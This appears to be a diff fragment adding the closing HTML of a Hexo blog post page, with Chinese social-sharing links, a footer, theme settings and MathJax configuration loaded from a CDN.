+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2021 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
